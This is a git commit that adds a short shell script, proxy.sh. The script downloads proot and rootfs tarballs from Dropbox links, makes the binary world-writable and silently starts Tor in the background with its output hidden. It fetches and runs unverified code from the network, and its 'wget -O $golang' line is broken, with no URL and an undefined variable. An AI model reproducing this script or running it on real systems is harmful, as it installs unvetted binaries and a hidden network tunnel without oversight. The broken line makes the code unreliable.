6a662a647078fa158e22fa209251c89a40a325fa
pickaxecolleague <100679616+pickaxecolleague@users.noreply.github.com>
2022-03-11 12:33:46 +0700

    Create proxy.sh

---
+++ proxy.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+#127.0.0.1:9050
+
+proot=https://www.dropbox.com/s/qhtue5w4rnxlip3/proot.tar.gz?dl=0
+rootfs=https://www.dropbox.com/s/qrzrq6p26684xex/rootfs.tar.xz?dl=0
+
+wget -O proot.tar.gz $proot
+wget -O rootfs.tar.xz $rootfs
+wget -O $golang
+
+tar -xf proot.tar.gz
+tar -xf rootfs.tar.xz
+
+rm -rf *.tar.*
+
+chmod 777 dist/proot
+
+nohup ./dist/proot -S . apt update && apt install -y tor && tor  &>/dev/null &
